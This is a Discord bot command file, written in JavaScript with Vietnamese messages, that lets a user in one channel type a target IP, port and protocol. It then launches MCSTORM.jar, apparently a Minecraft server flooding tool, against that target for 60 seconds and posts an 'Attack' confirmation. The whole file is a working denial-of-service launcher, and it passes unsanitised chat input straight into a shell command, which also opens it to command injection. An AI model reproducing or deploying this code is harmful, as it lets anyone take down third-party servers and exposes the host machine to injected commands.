const { MessageEmbed } = require("discord.js")

module.exports = {
    name: 'fuck',
    description: 'serverfuck',
    execute(client, message, args, Discord) {
        const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const protocol = message.content.split (" ")[3]

if(!args[0]) {
	const embed1 = new MessageEmbed()
	.setColor('RANDOM')
	.setTitle('VD:')
	.setDescription("`EXAMPLE: +fuck [ip] [port] [protocols]`")
	message.channel.send(embed1);
	return;
	}

if(!args[1]) {
	const embed1 = new MessageEmbed()
	.setColor('RANDOM')
	.setTitle('`GHI THEM PORT VAO`')
	message.channel.send(embed1);
	return;
	}

if(!args[2]) {
	const embed1 = new MessageEmbed()
	.setColor('RANDOM')
	.setTitle('THUC HIEN NOW')
	.setDescription("`VUI LONG GHI PROTOCOLS`")
	message.channel.send(embed1);
	return;
	}
	
if (message.channel.id != 1001403369325342751) {
	return;
  }
  
var exec = require('child_process').exec
exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCSTORM.jar ${host}:${port} ${protocol} sf 60 -1`, (error, stdout, stderr) => {
});

const embed1 = new MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Attack')
	.setTimestamp()
	.setDescription("**Người Dùng**: `" + message.author.username + "` \n **Máy Chủ**: `" + host + "` \n **Port**: `" + port + "` \n **Phiên Bản**: `" + protocol + "`\n \n **Phương pháp**: `ServerFuck` \n **Power**: `MAX` \n **Thời gian**: `60 giây 🕒`")
	.setFooter('RIN NGAU LOI', client.user.avatarURL)
	.setTimestamp()
	
	.setThumbnail()
 message.channel.send(embed1);
    }
}
